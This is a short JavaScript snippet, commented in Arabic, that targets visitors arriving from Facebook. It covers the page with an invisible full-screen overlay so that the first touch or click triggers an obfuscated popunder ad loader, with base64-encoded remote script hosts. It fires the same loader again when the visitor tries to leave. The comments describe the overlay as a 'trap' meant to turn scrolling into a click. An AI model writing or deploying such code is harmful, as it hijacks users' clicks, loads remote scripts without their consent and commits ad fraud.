(function() {
    const params = new URLSearchParams(window.location.search);
    if (!params.has("fb_source")) return;

    let isFired = false;

    // 1. إنشاء "فخ" شفاف يغطي منطقة اللمس
    const trap = document.createElement('div');
    trap.style.cssText = `
        position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
        z-index: 2147483647; background: transparent; cursor: pointer;
    `;
    document.body.appendChild(trap);

    // 2. وظيفة إطلاق الإعلان (Adsterra الرسمي)
    function triggerAd() {
        if (isFired) return;
        isFired = true;

        // تنفيذ كود البوب الرسمي
        (function(){var x=window,m="e23f9a20a32bcb0e16cc092ebc328951",z=[["siteId",260-829*134*841-342+97961243],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],s=["d3d3LmludGVsbGlwb3B1cC5jb20vVGxjL3hmbG93dHlwZS5taW4uanM=","ZDNtcjd5MTU0ZDJxZzUuY2xvdWRmcm9udC5uZXQvTnZGL1BNL2diYXRtYW4ubWluLmNzcw=="],c=-1,o,w,d=function(){clearTimeout(w);c++;if(s[c]&&!(1801238139000<(new Date).getTime()&&1<c)){o=x.document.createElement("script");o.type="text/javascript";o.async=!0;var r=x.document.getElementsByTagName("script")[0];o.src="https://"+atob(s[c]);o.crossOrigin="anonymous";o.onerror=d;o.onload=function(){clearTimeout(w);};w=setTimeout(d,5E3);r.parentNode.insertBefore(o,r)}};if(!x[m]){try{Object.freeze(x[m]=z)}catch(e){}d()}})();

        // إزالة الفخ فوراً للسماح للزائر بالتفاعل مع الموقع
        setTimeout(() => {
            trap.remove();
        }, 100);
    }

    // 3. تحويل أي لمسة (Touch) أو نقرة (Click) إلى تفعيل فوري
    // المتصفح سيرى "نقرة" حقيقية على عنصر DIV
    trap.addEventListener('mousedown', triggerAd, { once: true });
    trap.addEventListener('touchstart', function(e) {
        // هذه هي اللحظة التي يتحول فيها التمرير لنقرة
        triggerAd();
    }, { once: true });

    // 4. خدعة إضافية: إذا حاول الزائر إغلاق الصفحة (Exit Intent)
    window.onbeforeunload = function() {
        triggerAd();
    };

})();
